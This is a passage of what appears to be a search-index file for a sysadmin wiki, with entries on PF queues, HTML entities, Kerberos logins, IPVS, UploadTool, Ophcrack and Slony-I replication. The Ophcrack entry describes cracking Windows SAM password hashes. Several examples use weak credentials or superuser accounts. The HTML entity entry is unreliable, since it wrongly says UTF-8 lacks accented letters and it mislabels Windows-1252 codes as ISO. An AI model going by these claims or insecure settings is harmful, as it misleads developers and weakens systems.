0.2 26 ssh_bulk 7440 hfsc 4 11 3042 0 0 0 0 0 bulk 7440 hfsc 4 406 44540 0 0 0 80 403 bittor 7440 hfsc 3 0 0 0 0 0 0 0 spamd 7440 hfsc 2 24424 1412491 0 0 140 15 923 The output above is similar to what you are looking for. You need to test each type of queue you setup to make sure you see the packets being added to the correct queue. For example, you could ssh to another machine going out the external interface and as you do so you should see packets being add to the “ssh_login” queue.\n"
            }
        );
    index.add(
            {
                id:  729 ,
                href: "\/OpenSPF:_Mise_en_place_d\u0027OpenSPF\/",
                title: "OpenSPF: Setting up OpenSPF",
                description: "How to set up OpenSPF, the open source version of SPF, with documentation for implementing it with Postfix.",
                content: "OpenSPF is the open source version of SPF. In terms of functionality, they are the same. Here is documentation explaining how to implement this type of solution:\nOpenSPF on Postfix Documentation\n"
            }
        );
    index.add(
            {
                id:  730 ,
                href: "\/Les_caract%C3%A8res_sp%C3%A9ciaux\/",
                title: "Special Characters",
                description: "Comprehensive guide on special characters for HTML encoding, including ISO and HTML codes for accented letters and symbols.",
                content: "Introduction linkThe default encoding format for HTML pages is UTF-8, which is the American format. However, this format does not include our Latin accented characters.\nIt is necessary to conform to this standard by encoding our special characters in a format that this standard can understand. That’s why there are two encodings: one ISO in numeric format and the other specific to HTML expressed in natural language.\nAn ISO code is written as: \u0026#code;, while an HTML code is written as: \u0026name;.\nGeneral Coding Rules linkHTML codes are mnemonic abbreviations (in English) of accented letters.\nSyntax:\n\u0026 letter + abbreviation;\nExample for É:\nRule: \u0026 E + acute;\nActual code: \u0026 Eacute;\nList of the most common abbreviations:\nDescription HTML Abbreviation grave accent grave acute accent acute circumflex accent circ cedilla cedil umlaut uml tilde tilde Table of ISO and HTML Codes for Special Characters link Character ISO Code HTML Abbreviation Non-breaking Space \u0026#160; \u0026nbsp; A À \u0026#192; \u0026Agrave; Á \u0026#193; \u0026Aacute; Â \u0026#194; \u0026Acirc; Ã \u0026#195; \u0026Atilde; Ä \u0026#196; \u0026Auml; Å \u0026#197; \u0026Aring; Æ \u0026#198; \u0026Aelig; à \u0026#224; \u0026agrave; á \u0026#225; \u0026aacute; â \u0026#226; \u0026acirc; ã \u0026#227; \u0026atilde; ä \u0026#228; \u0026auml; å \u0026#229; \u0026aring; æ \u0026#230; \u0026aelig; C Ç \u0026#199; \u0026Ccedil; ç \u0026#231; \u0026ccedil; D Ð \u0026#208; \u0026ETH; ð \u0026#240; \u0026eth; E È \u0026#200; \u0026Egrave; É \u0026#201; \u0026Eacute; Ê \u0026#202; \u0026Ecirc; Ë \u0026#203; \u0026Euml; è \u0026#232; \u0026egrave; é \u0026#233; \u0026eacute; ê \u0026#234; \u0026ecirc; ë \u0026#235; \u0026euml; I Ì \u0026#204; \u0026Igrave; Í \u0026#205; \u0026Iacute; Î \u0026#206; \u0026Icirc; Ï \u0026#207; \u0026Iuml; ì \u0026#236; \u0026igrave; í \u0026#237; \u0026iacute; î \u0026#238; \u0026icirc; ï \u0026#239; \u0026iuml; N Ñ \u0026#209; \u0026Ntilde; ñ \u0026#241; \u0026ntilde; O Ò \u0026#210; \u0026Ograve; Ó \u0026#211; \u0026Oacute; Ô \u0026#212; \u0026Ocirc; Õ \u0026#213; \u0026Otilde; Ö \u0026#214; \u0026Ouml; Ø \u0026#216; \u0026Oslash; Œ \u0026#140; \u0026OElig; ò \u0026#242; \u0026ograve; ó \u0026#243; \u0026oacute; ô \u0026#244; \u0026ocirc; õ \u0026#245; \u0026otilde; ö \u0026#246; \u0026ouml; ø \u0026#248; \u0026oslash; œ \u0026#156; \u0026oelig; S Š \u0026#138; š \u0026#154; U Ù \u0026#217; \u0026Ugrave; Ú \u0026#218; \u0026Uacute; Û \u0026#219; \u0026Ucirc; Ü \u0026#220; \u0026Uuml; ù \u0026#249; \u0026ugrave; ú \u0026#250; \u0026uacute; û \u0026#251; \u0026ucirc; ü \u0026#252; \u0026uuml; Y Ý \u0026#221; \u0026Yacute; Ÿ \u0026#159; \u0026Yuml; ý \u0026#253; \u0026yacute; ÿ \u0026#255; \u0026yuml; Z Ž \u0026#142; ž \u0026#158; Currency Symbols ¢ \u0026#162; \u0026cent; £ \u0026#163; \u0026pound; ¥ \u0026#165; \u0026yen; Legal Symbols ™ \u0026#153; © \u0026#169; \u0026copy; ® \u0026#174; \u0026reg; Numerical Symbols ‰ \u0026#137; ª \u0026#170; \u0026ordf; º \u0026#186; \u0026ordm; ¹ \u0026#185; \u0026sup1; ² \u0026#178; \u0026sup2; ³ \u0026#179; \u0026sup3; ¼ \u0026#188; \u0026frac14; ½ \u0026#189; \u0026frac12; ¾ \u0026#190; \u0026frac34; ÷ \u0026#247; \u0026divide; × \u0026#215; \u0026times; \u003e \u0026#155; \u0026gt; \u003c \u0026#139; \u0026lt; ± \u0026#177; \u0026plusmn; Other Symbols \u0026 \u0026amp; ‚ \u0026#130; ƒ \u0026#131; „ \u0026#132; … \u0026#133; † \u0026#134; ‡ \u0026#135; ˆ \u0026#136; ' \u0026#145; ' \u0026#146; \" \u0026#147; \" \u0026#148; • \u0026#149; – \u0026#150; — \u0026#151; ˜ \u0026#152; ¿ \u0026#191; \u0026iquest; ¡ \u0026#161; \u0026iexcl; ¤ \u0026#164; \u0026curren; ¦ \u0026#166; \u0026brvbar; § \u0026#167; \u0026sect; ¨ \u0026#168; \u0026uml; « \u0026#171; \u0026laquo; » \u0026#187; \u0026raquo; ¬ \u0026#172; \u0026not; ¯ \u0026#175; ´ \u0026#180; \u0026acute; µ \u0026#181; \u0026micro; ¶ \u0026#182; \u0026para; · \u0026#183; \u0026middot; ¸ \u0026#184; \u0026cedil; Þ \u0026#222; \u0026thorn; ß \u0026#223; \u0026szlig; "
            }
        );
    index.add(
            {
                id:  731 ,
                href: "\/MySecureShell%C2%A0:%C2%A0Mise_en_place_d%27une_solution_s%C3%A9curis%C3%A9e_de_transfert_de_fichiers\/",
                title: "MySecureShell: Setting up a Secure File Transfer Solution",
                description: "How to set up MySecureShell for secure file transfers using OpenSSH with ACLs similar to a classic FTP server.",
                content: "Introduction linkIt was about time this documentation arrived! Although I am one of the founders and developers of MySecureShell, creating a quick and simpler guide than the one on the website was a bit daunting. But I finally found this magnificent documentation.\nFor those who don’t know, MySecureShell is a server that relies on OpenSSH to provide ACLs similar to those on a classic FTP server. The advantage is security!\nAdditionally, there’s a Java interface to manage everything for those who want it.\nReferences linkDocumentation on setting up MySecureShell\n"
            }
        );
    index.add(
            {
                id:  732 ,
                href: "\/Initramfs_:_corriger_les_petits_probl%C3%A8mes_de_boot_kernel_gr%C3%A2ce_%C3%A0_initramfs\/",
                title: "Initramfs: Fixing Kernel Boot Issues with Initramfs",
                description: "This guide explains how to use initramfs to solve kernel boot issues when disk detection order changes.",
                content: "Problem linkI just installed a server with many SATA disks. The machine has 4.5TB of storage spread across 2 Areca ARC-1280ML controllers. The Debian/etch installation went without issues using kernel 2.6.18-5-686. After installing the system on 2 disks connected to the motherboard (ICH5R controller using the ata_piix driver), RAID5 volumes are created on the Areca cards (arcmsr driver). However, boot stops at an initramfs command prompt, unable to find the root partition:\nBegin: Waiting for root file system... ... Done. Check root= bootarg cat /proc/cmdline or missing modules, devices: cat /proc/modules ls /dev ALERT! /dev/sda1 does not exist. Dropping to a shell! Busybox v1.1.3 (Debian 1:1.1.1-4) Built-in shell (ash) Enter 'help' for a list of built-in commands. /bin/sh: can't access tty; job control turned off (initramfs) Explanation linkWhat’s happening? Simply put, the new volumes are detected by the kernel before the disk on which the system is installed. As a result, the system is no longer on /dev/sda but on /dev/sdc. And the funniest part is that it’s sometimes on /dev/sdb because the Areca controllers take time to initialize.\nHow do we fix this issue? By working with the initialization RAM partition, namely initramfs.\nSolution linkIt’s extremely simple. We’ll ask the RAM boot partition to load the SATA modules in the order we want. In our case, the ata_piix driver before arcmsr. Debian tools make this very easy, just add the modules you want loaded during startup to the /etc/initramfs-tools/modules file. Modules should be listed one per line in the desired loading order. In our case, we just need to specify the module that handles the boot disk.\n# cat /etc/initramfs-tools/modules [...] ata_piix Now we need to update the RAM image to apply these changes:\n# update-initramfs -v -k 2.6.18-5-686 -t -u Keeping /boot/initrd.img-2.6.18-5-686.dpkg-bak update-initramfs: Generating /boot/initrd.img-2.6.18-5-686 Adding module /lib/modules/2.6.18-5-686/kernel/drivers/scsi/scsi_mod.ko Adding module /lib/modules/2.6.18-5-686/kernel/drivers/scsi/scsi_transport_spi.ko Adding module /lib/modules/2.6.18-5-686/kernel/drivers/scsi/aic7xxx/aic7xxx.ko [...] Adding binary /sbin/mdrun Building cpio /boot/initrd.img-2.6.18-5-686 initramfs Backup /boot/initrd.img-2.6.18-5-686.bak After a reboot, everything is back to normal. The best part is that when you need to update your kernel, the new kernel will automatically rebuild the initialization RAM image.\n"
            }
        );
    index.add(
            {
                id:  733 ,
                href: "\/Port_forwarding_depuis_dom0_vers_bridged_domU_avec_IPVS\/",
                title: "Port forwarding from dom0 to bridged domU with IPVS",
                description: "How to forward ports from a dom0 to a bridged domU in Xen using IPVS, overcoming Netfilter issues",
                content: "Introduction linkThose following zone0’s adventures know: Netfilter sucks badly when it comes to forwarding simple ports from a dom0 to a bridged domU. That’s just how it is, we don’t know where it comes from, maybe from 64-bit, maybe from BSD domUs, maybe from the Xen kernel, maybe, maybe, maybe. Anyway, after many hours of tweaking, debugging, tcpdump and so on, we decided on IPVS. I’ve posted the results of our experiences here, so if you also want to set up a simple port forwarding between Xen domains, you won’t have to waste an entire Saturday and miss the techno-parade.\nI’ll add that this excellent tutorial on IPVS will allow you to quickly familiarize yourself with the tool.\nBy the way, I know, IPVS is OLD.\nMise en place linkWe, an OSS advocacy group, setup a Xen 3.1 machine composed of:\na 64 bits dom0 running Debian stable amd64 2 hvm domUs running OpenBSD amd64 2 hvm domUs running NetBSD i386 This machine is to be hosted and reachable from the Internet, but it will only have one public IP. Naturally, our first tought was to port-forward using iptables / netfilter. We didn’t really though it would be an issue… and that was a mistake :) We tried many options, read many hints, even on this list, but no matter what, the port-forwarding, using a ultra-classic PREROUTING / FORWARD rule, was given a TCP RST in the best scenario. We read here stories about activating NAT / masquerading on the domU to fix (???) this issue, but as the machine is meant to be hosted, that was not the cleanest approach.\nAnd then we took a look at IPVS (http://www.linuxvirtualserver.org/software/ipvs.html), an opensource Linux kernel module initially meant to act as a loadbalancer. We thought that providing a unique real server (the domU) to the VIP would do the trick… and it did! Here’s a quick example of a working configuration:\ndom0 has a public IP address, no services but ssh available domU has a RFC1918 address, linked to a bridge on the second ethernet interface of the dom0 We want to redirect the port 2222 of the dom0 to the port 22 of the domU:\nInstall ipvsadm on the dom0 (apt-get install ipvsadm on debian) Setup the VIP: ipvsadm -A -t :2222 -s rr We choosed the Round-Robin algorithm, but obviously this has no effect for us as there will be only one real server behind the loadbalancer\nInsert domU’s private IP on the VIP: ipvsadm -a -t :2222 -r :22 -m Here we use the simple masquerading mode of IPVS\nSee the output: $ root@dom0:~# ipvsadm -L IP Virtual Server version 1.2.1 (size=4096) Prot LocalAddress:Port Scheduler Flags -\u003e RemoteAddress:Port Forward Weight ActiveConn InActConn TCP dom0:2222 rr -\u003e shells:ssh Masq 1 0 0 And finally, from an outside machine:\n$ imil@tatooine:~$ ssh -p 2222 dom0 imil@dom0_public_ip's password: Last login: Sun Sep 16 01:15:40 2007 from somewhere_else OpenBSD 4.1 (GENERIC) #874: Sat Mar 10 19:09:51 MST 2007 imil@shells ~$ It Works!\nHope this method can save time to some of you, for us it’s now the perfect solution as it provides us also the ability to loadbalance services on other domU’s.\nReferences linkhttp://www.gcu.info/2411/2007/09/16/si-tu-casses-ta-cuiller-prend-une-pellle-sin-youn-beol-prophete/\n"
            }
        );
    index.add(
            {
                id:  734 ,
                href: "\/Smokeping_:_Monitorer_la_latence\/",
                title: "Smokeping: Monitoring Latency",
                description: "Learn how to use Smokeping to monitor latency of services and applications.",
                content: "Smokeping allows you to monitor latency of services, applications, and more.\nDocumentation on Monitoring Network Latency With Smokeping\n"
            }
        );
    index.add(
            {
                id:  735 ,
                href: "\/Acc%C3%A9l%C3%A9rer_les_scripts_CGI_avec_SpeedyCGI-PersistantPerl\/",
                title: "Accelerating CGI Scripts with SpeedyCGI-PersistantPerl",
                description: "A solution to accelerate Perl CGI scripts using SpeedyCGI/PersistantPerl to improve performance.",
                content: "Introduction linkHere is a solution to accelerate Perl scripts in CGI:\nDocumentation on Speeding Up Perl Scripts With SpeedyCGI-PersistantPerl\n"
            }
        );
    index.add(
            {
                id:  736 ,
                href: "\/Authentification_de_comptes_Solaris_sur_un_Active_Directory\/",
                title: "Authenticating Solaris Accounts on Active Directory",
                description: "Learn how to set up authentication of Solaris accounts using Windows Active Directory and the Kerberos protocol.",
                content: "Introduction linkImplementation of authentication on Solaris from an Active Directory (AD).\nWhat this implementation allows for user management on a machine:\nSolaris accounts need to be created with an identifier identical to the AD one, with disk space. Password verification is done via AD. This document is based on a scenario of implementing this type of authentication on Solaris 9.\nThe concepts described here apply to all UNIX operating systems that support Kerberos version 5 protocol.\nEnvironment:\nserver_ad.domain.com is the Active Directory server, domain.com is the domain managed by server_ad. Prerequisites linkPrerequisites:\nKerberos version 5 (in Sun Enterprise Authentication Mechanism (SEAM) 1.0.1 product), ensure that DNS is properly configured on the domain that is managed by Active Directory, ensure that the date is properly synchronized with the AD server (ntpdate). Configuration linkFiles to configure to allow authentication on the Solaris station via AD are:\n/etc/pam.conf to indicate that Kerberos should be used for authentication, /etc/krb5/krb5.conf for using the KDC (Key Distribution Center) of the AD domain. krb5.conf linkNew configuration file /etc/krb5/krb5.conf:\n# PAM Configuration # 13/03/2007 - Yann Le Thieis # # Authentication # other auth sufficient pam_krb5.so.1 other auth sufficient pam_unix.so.1 try_first_pass # # Password # other password sufficient pam_krb5.so.1 other password sufficient pam_unix.so.1 # # Account # other account optional pam_krb5.so.1 other account optional pam_unix.so.1 # # Session # other session optional pam_krb5.so.1 other session optional pam_unix.so.1 pam.conf linkFirst, back up the original version of krb5.conf:\n$ cp -p /etc/krb5/krb5.conf /etc/krb5/krb5.conf.old The configuration:\n# krb5.conf configuration for domain domain.com # 13/03/2007 by Yann Le Thieis # [libdefaults] default_realm = DOMAIN.COM verify_ap_req_nofail = false [realms] domain.com = { kdc = server_ad.domain.com:88 admin_server = server_ad.domain.com:749 default_domain = domain.com } [domain_realm] .domain.com = DOMAIN.COM domain.com = DOMAIN.COM [logging] default = FILE:/var/krb5/kdc.log kdc = FILE:/var/krb5/kdc.log kdc_rotate = { # How often to rotate kdc.log. Logs will get rotated no more # often than the period, and less often if the KDC is not used # frequently. period = 1d # how many versions of kdc.log to keep around (kdc.log.0, kdc.log.1, ...) versions = 10 } [appdefaults] kinit = { renewable = true forwardable= true } gkadmin = { help_url = http://docs.sun.com:80/ab2/coll.384.1/SEAM/@AB2PageView/1195 } The line “verify_ap_req_nofail = false” is extremely important if the file /etc/krb5/krb5.keytab is not filled with a line for your domain (i.e., a key that validates the KDC, see the man krb5.conf manual).\nTesting this configuration linkThe AD account used for the test is ylethieis, which does not exist locally on the Solaris machine. But first, let’s try with a dummy account that doesn’t exist anywhere.\n$ kinit bidon Password for bidon@domain.com: kinit: Client not found in Kerberos database while getting initial credentials Note: kinit – obtain and cache Kerberos ticket-granting ticket.\nTry with the ylethieis account but entering a wrong password:\n$ kinit ylethieis Password for ylethieis@domain.com: kinit: Pre-authentication failed while getting initial credentials Try with the ylethieis account and the correct password for AD:\n$ kinit ylethieis Password for ylethieis@domain.com: The Kerberos client service on the Solaris machine correctly queries the AD.\nCached tickets:\n$ klist Ticket cache: /tmp/krb5cc_0 Default principal: ylethieis@domain.com Valid starting Expires Service principal Tuesday, March 13, 2007, 11:03:14 GMT Tuesday, March 13, 2007, 21:03:14 GMT krbtgt/domain.com@domain.com renewable until Tuesday, March 13, 2007, 21:03:14 GMT Creating an AD account environment on the Solaris machine linkCreate the space for accounts authenticated via AD, and an ad user group to distinguish them from others (not mandatory!):\n$ mkdir /export/home/ad $ groupadd ad Add an ylethieis account:\n$ useradd -g ad -m -d /export/home/ylethieis ylethieis UX: useradd: ylethieis name too long. 64 blocks This account has the ad group as its primary group.\nThe login name is indicated as too long but the account was successfully created!\nAt this stage, on the Solaris system, the ylethieis user:\nhas no password, has ad as its primary group, is just listed in /etc/passwd. Login to the Solaris system with the ylethieis account:\n$ telnet server_solaris Trying 192.168.0.120... Connected to 192.168.0.120. Escape character is '^]'. SunOS 5.9 login: ylethieis Enter Kerberos password for ylethieis: Last login: Tue Mar 13 14:27:52 from yuluth Sun Microsystems Inc. SunOS 5.9 Generic January 2003 $ We can see that authentication via Active Directory has succeeded for the ylethieis account.\n"
            }
        );
    index.add(
            {
                id:  737 ,
                href: "\/Mise_en_forme_du_texte\/",
                title: "Text Formatting",
                description: "Guide to HTML text formatting including paragraphs, line breaks, alignment, importance tags, font styling, and more.",
                content: "The Tags linkParagraph Tags linkThis is a very simple tag: You need to open it when starting a paragraph, and close it when ending one:\nexample\nLine Break Tags linkNote the final slash indicating it’s a solitary tag.\nWe can play with paragraphs and line breaks like this:\nexample example2 This will simply write:\nexample example2 Alignment Tags linkWe can include an alignment attribute in the paragraph tag.\nThis is the align attribute. It allows placing text either on the left side of the page (left value), on the right (right value), or centered (center value).\nExample:\nexample\nImportance Tags linkWe can emphasize a paragraph more.\nFor this, we’ll use the tags where x represents a natural integer between 1 and 6.\nThese tag families modify the importance given to elements between the opening and closing tags. The closer to 1, the more important the text. And conversely if we move away from it:\nexample Italic, Bold and Underlining linkTo put text in italic, use this tag:\nTo make it bold, use:\nWhile for underlining, use:\nSubscripts and Superscripts linkFor superscripts, use this tag:\nWhile for subscripts, use:\nBlockQuote linkTo insert text with a slight margin on the right, you can use this tag. There isn’t much to say about it, except that it’s possible to nest several inside each other:\nAcronym Tags linkAn acronym is an abbreviation like C.A.F., C.E.O., etc…\nTo keep track, we can offer our visitors the translation of these without cluttering the page.\nFor this, simply use the tag.\nIt takes the meaning of this acronym as a title argument.\nExample:\nthe SNCF This will display “the SNCF”. If the internet user places their mouse cursor over it, a small bubble appears displaying the meaning of this acronym.\nFont Tags linkThere are many fonts around the world.\nThe Internet user doesn’t have all of them by default.\nIf they don’t have the font used, well, it will be the default font, defined by the browser, that will be used. Not great for aesthetics… So be careful not to choose too exotic fonts.\nthe text You can also modify the size of the font used, thanks to the size argument. This takes natural integers between 1 and 7 as values.\nthe text Summary of Basic Tags link Tag Description Example to italicize test to bold test to underline test to decrease character size test to increase character size test to subscript test to superscript test for fixed-width font test to strikethrough test same as above test "
            }
        );
    index.add(
            {
                id:  738 ,
                href: "\/UploadTool_:_Mise_en_place_d%27un_outil_d%27%C3%A9change_de_fichiers_via_Apache\/",
                title: "UploadTool: Setting up a file sharing tool via Apache",
                description: "A guide to install and configure UploadTool, a web-based file sharing tool that uses Apache for authenticated file uploads.",
                content: "Introduction linkI was looking for a software for the company I work for, that allows file transfers with authentication but just at the upload level. So I found UploadTool.\nInstallation linkDownload the upload.tar.gz 1.0 archive and extract it:\nwget http://belnet.dl.sourceforge.net/sourceforge/uploadtool/upload.tar.gz tar -xzvf upload.tar.gz Next, we’ll move everything to our Apache directory, then assign the correct permissions:\nmv upload /var/www chown -Rf www-data. /var/www/upload Configuration linkTo configure it, it’s quite simple, just go to the URL of your site followed by upload. Example: https://www.mydomain.com/upload.\nCreate your root account and then the users who will have access to upload.\nProtections for public folders linkTo protect yourself from listing uploaded files, I suggest a small HTML redirector.\nEnhancement patch link *** bin/common.php 2006-05-08 02:23:34.000000000 +0200 --- bin/common.php 2007-09-03 11:46:22.000000000 +0200 *************** *** 59,67 **** --- 59,70 ---- echo 'File Name'; echo 'Size'; echo 'Date'; + echo 'URL to give'; echo ''; foreach ($files as $filename) { + if ($filename !== \"index.html\") + { $url = filepath2url($cwd . \"/\" . $filename); echo \"\"; echo \"\"; *************** *** 78,84 **** --- 81,91 ---- echo \"\"; echo date (\"Y-m-d H:i:s\", filemtime($cwd . \"/\" . $filename)); echo \"\"; + echo \"\"; + echo \"$url\"; + echo \"\"; echo \"\\n\"; + } } echo ''; } Here’s a patch I created to improve the interface a bit. To apply it, create an “upload.patch” file that you put in your upload folder, then run this command:\npatch -p0 \u003c upload.patch Admire the result :-)\nUpload size limitations linkHere’s what you need to add in your Apache VirtualHost to limit the size of uploaded files:\nphp_value max_execution_time 300 php_value upload_max_filesize 40M php_value post_max_size 40M LimitRequestBody 40000000 "
            }
        );
    index.add(
            {
                id:  739 ,
                href: "\/Trouver_les_mots_de_passe_de_la_base_SAM_de_Windows\/",
                title: "Finding passwords from the Windows SAM database",
                description: "How to recover lost Windows passwords from the SAM database using Ophcrack.",
                content: "Are you one of those people who have lost their password? And you neither want to reset it through the recovery console, nor format your Windows installation to be able to use your machine.\nWell, Ophcrack is made for you! It will mount your Windows partition in NTFS, then crack the LM and NTLM hashes, and display them before your amazed eyes - all in just a few minutes :-)\n"
            }
        );
    index.add(
            {
                id:  740 ,
                href: "\/Slony-I_:_R%C3%A9plication_de_bases_pour_PostgresSQL\/",
                title: "Slony-I: Database Replication for PostgreSQL",
                description: "Guide on how to configure and manage database replication in PostgreSQL using Slony-I, including installation, configuration and high availability setup.",
                content: "Introduction linkSlony-I enables advanced database replication capabilities. The downside is that it’s not simple to set up the first time. People who have previously configured DB replications will find it easier to succeed.\nAccording to Slony’s documentation, it’s not recommended to replicate across a WAN, as the slon daemon (replication daemon) is very fragile and may leave a database in a zombie state, and won’t die for up to 2 hours.\nInstallation linkHere’s how to install Slony-I for PostgreSQL 8.2:\napt-get install postgresql-8.2-slony1 slony1-bin postgresql-contrib-8.2 Edit your hosts file on your nodes and add:\n192.168.0.87 deb-node1 192.168.0.88 deb-node2 We have set the IP address first followed by the hostnames associated with the IPs.\nPreparation linkEnvironment linkYou need to set up some environment variables for your postgres user. Insert them in your shell configuration file (e.g. ~/.profile):\nexport CLUSTERNAME=slony_example export MASTERDBNAME=pgbench export SLAVEDBNAME=pgbenchslave export MASTERHOST=localhost export SLAVEHOST=localhost export REPLICATIONUSER=pgsql export PGBENCHUSER=pgbench PATH=$PATH:/usr/lib/postgresql/8.2/bin/ Users linkFor flexibility rather than security, we’ll create a “replicationuser” with super-user rights. Create this user on all your PostgreSQL servers:\ncreateuser -A -D $PGBENCHUSER createuser -A -D $PGBENCHUSER -h $SLAVEHOST createuser -s $REPLICATIONUSER createuser -s $REPLICATIONUSER -h $SLAVEHOST If it doesn’t prompt you to change passwords, make sure to do it for the users:\npsql -d template1 -c \"alter user $PGBENCHUSER with password 'password'\" psql -d template1 -c \"alter user $PGBENCHUSER with password 'password'\" -h $SLAVEHOST psql -d template1 -c \"alter user $REPLICATIONUSER with password 'password'\" psql -d template1 -c \"alter user $REPLICATIONUSER with password 'password'\" -h $SLAVEHOST Creating the Databases linkFrom now on, if you encounter password problems, add the following to your commands:\n-P password Next, let’s prepare the databases:\ncreatedb -O $PGBENCHUSER -h $MASTERHOST $MASTERDBNAME createdb -O $PGBENCHUSER -h $SLAVEHOST $SLAVEDBNAME Creating databases for Slony:\npgbench -i -s 1 -U $PGBENCHUSER -h $MASTERHOST $MASTERDBNAME If some lines fail, check your permissions (/etc/postgresql/8.2/main/pg_hba.conf) and ensure that PostgreSQL is not bound to localhost only.\nYou need to have the pl/pgSQL procedural language installed, then:\ncreatelang -h $MASTERHOST plpgsql $MASTERDBNAME Slony does not automatically import databases when a slave enters the cluster. We need to import them manually:\npg_dump -s -U $REPLICATIONUSER -h $MASTERHOST $MASTERDBNAME | psql -U $REPLICATIONUSER -h $SLAVEHOST $SLAVEDBNAME Test Data Population linkTo illustrate how Slony-I performs real-time replication, we’ll run pgbench (launch in a separate window):\npgbench -s 1 -c 5 -t 1000 -U $PGBENCHUSER -h $MASTERHOST $MASTERDBNAME This command will run pgbench 5 times, creating 1000 transactions on the database with $PGBENCHUSER.\nConfiguration linkSlonik is a utility that allows scripting to facilitate Slony administration. You can create tables, register procedures, etc.\nConfiguration Script link Here’s a script (script-initilization.sh) that will create the initial connection. Edit it according to your needs (add passwords if needed):\n#!/bin/sh slonik \u003c\u003c_EOF_ #-- # define the namespace the replication system uses in our example it is # slony_example #-- cluster name = $CLUSTERNAME; #-- # admin conninfo's are used by slonik to connect to the nodes one for each # node on each side of the cluster, the syntax is that of PQconnectdb in # the C-API # -- node 1 admin conninfo = 'dbname=$MASTERDBNAME host=$MASTERHOST user=$REPLICATIONUSER'; node 2 admin conninfo = 'dbname=$SLAVEDBNAME host=$SLAVEHOST user=$REPLICATIONUSER'; #-- # init the first node. Its id MUST be 1. This creates the schema # _$CLUSTERNAME containing all replication system specific database # objects. #-- init cluster ( id=1, comment = 'Master Node'); #-- # Because the history table does not have a primary key or other unique # constraint that could be used to identify a row, we need to add one. # The following command adds a bigint column named # _Slony-I_$CLUSTERNAME_rowID to the table. It will have a default value # of nextval('_$CLUSTERNAME.s1_rowid_seq'), and have UNIQUE and NOT NULL # constraints applied. All existing rows will be initialized with a # number #-- table add key (node id = 1, fully qualified name = 'public.history'); #-- # Slony-I organizes tables into sets. The smallest unit a node can # subscribe is a set. The following commands create one set containing # all 4 pgbench tables. The master or origin of the set is node 1. #-- create set (id=1, origin=1, comment='All pgbench tables'); set add table (set id=1, origin=1, id=1, fully qualified name = 'public.accounts', comment='accounts table'); set add table (set id=1, origin=1, id=2, fully qualified name = 'public.branches', comment='branches table'); set add table (set id=1, origin=1, id=3, fully qualified name = 'public.tellers', comment='tellers table'); set add table (set id=1, origin=1, id=4, fully qualified name = 'public.history', comment='history table', key = serial); #-- # Create the second node (the slave) tell the 2 nodes how to connect to # each other and how they should listen for events. #-- store node (id=2, comment = 'Slave node'); store path (server = 1, client = 2, conninfo='dbname=$MASTERDBNAME host=$MASTERHOST user=$REPLICATIONUSER'); store path (server = 2, client = 1, conninfo='dbname=$SLAVEDBNAME host=$SLAVEHOST user=$REPLICATIONUSER'); store listen (origin=1, provider = 1, receiver =2); store listen (origin=2, provider = 2, receiver =1); _EOF_ Make it executable and run it:\nchmod 755 script-initilization.sh ./script-initilization.sh Altperl Scripts linkNow let’s copy the Slony configuration file:\ncd /usr/share/doc/slony1-bin/examples/ gzip -d slon_tools.conf-sample.gz cp slon_tools.conf-sample /etc/slony1/slon_tools.conf Modify this file according to your needs. Then initialize the cluster:\nslonik_init_cluster | slonik Start slon on both nodes:\nslon_start 1 # On node 1 slon_start 2 # On node 2 Create sets:\nslonik_create_set 1 Register the second node (1 = set ID, 2 = node ID):\nslonik_subscribe_set 2 | slonik Synchronization linkTo start synchronization (not database replication yet), run these commands on the appropriate nodes:\nslon $CLUSTERNAME \"dbname=$MASTERDBNAME user=$REPLICATIONUSER host=$MASTERHOST\" \u0026 # Run on the master slon $CLUSTERNAME \"dbname=$SLAVEDBNAME user=$REPLICATIONUSER host=$SLAVEHOST\" \u0026 # Run on the slave Add password=password inside the quotes if you get a password error (e.g., slon $CLUSTERNAME \"dbname=$MASTERDBNAME user=$REPLICATIONUSER host=$MASTERHOST password=password\").\nYou should now see many diagnostic messages. You can see the synchronization between nodes.\nReplication linkNow let’s replicate tables from node 1 to node 2:\n#!/bin/sh slonik \u003c\u003c_EOF_ # ---- # This defines which namespace the replication system uses # ---- cluster name = $CLUSTERNAME; # ---- # Admin conninfo's are used by the slonik program to connect # to the node databases. So these are the PQconnectdb arguments # that connect from the administrators workstation (where # slonik is executed). # ---- node 1 admin conninfo = 'dbname=$MASTERDBNAME host=$MASTERHOST user=$REPLICATIONUSER'; node 2 admin conninfo = 'dbname=$SLAVEDBNAME host=$SLAVEHOST user=$REPLICATIONUSER'; # ---- # Node 2 subscribes set 1 # ---- subscribe set ( id = 1, provider = 1, receiver = 2, forward = no); _EOF_ As with the script above, set the permissions and run it.\nAn initial replication will occur at a given moment (when the script is launched). At the end of the first replication, logs will be analyzed to check for any changes between the start time and the end of replication to catch up. Then those changes will be updated as well. After that, analyses for replication happen about once every 10 seconds (depending on the load of the machines).\nNow we have our two identical databases!\nVerification linkWe can verify using this script. It will dump both databases and compare them:\n#!/bin/sh echo -n \"**** comparing sample1 ... \" psql -U $REPLICATIONUSER -h $MASTERHOST $MASTERDBNAME \u003edump.tmp.1.$$ \u003c\u003c_EOF_ select 'accounts:'::text, aid, bid, abalance, filler from accounts order by aid; select 'branches:'::text, bid, bbalance, filler from branches order by bid; select 'tellers:'::text, tid, bid, tbalance, filler from tellers order by tid; select 'history:'::text, tid, bid, aid, delta, mtime, filler, \"_Slony-I_${CLUSTERNAME}_rowID\" from history order by \"_Slony-I_${CLUSTERNAME}_rowID\"; _EOF_ psql -U $REPLICATIONUSER -h $SLAVEHOST $SLAVEDBNAME \u003edump.tmp.2.$$ \u003c\u003c_EOF_ select 'accounts:'::text, aid, bid, abalance, filler from accounts order by aid; select 'branches:'::text, bid, bbalance, filler from branches order by bid; select 'tellers:'::text, tid, bid, tbalance, filler from tellers order by tid; select 'history:'::text, tid, bid, aid, delta, mtime, filler, \"_Slony-I_${CLUSTERNAME}_rowID\" from history order by \"_Slony-I_${CLUSTERNAME}_rowID\"; _EOF_ if diff dump.tmp.1.$$ dump.tmp.2.$$ \u003e$CLUSTERNAME.diff ; then echo \"success - databases are equal.\" rm dump.tmp.?.$$ rm $CLUSTERNAME.diff else echo \"FAILED - see $CLUSTERNAME.diff for database differences\" fi Adding a New Node link –\u003e Here’s an example of the .profile for the 3rd node to add:\nexport CLUSTERNAME=slony_example export MASTERDBNAME=pgbench export SLAVEDBNAME=pgbenchslave export MASTERHOST=localhost export SLAVEHOST=localhost export SLAVE2HOST=localhost export REPLICATIONUSER=pgsql export PGBENCHUSER=pgbench PATH=$PATH:/usr/lib/postgresql/8.2/bin/ Replicate your slony configuration file:\nscp 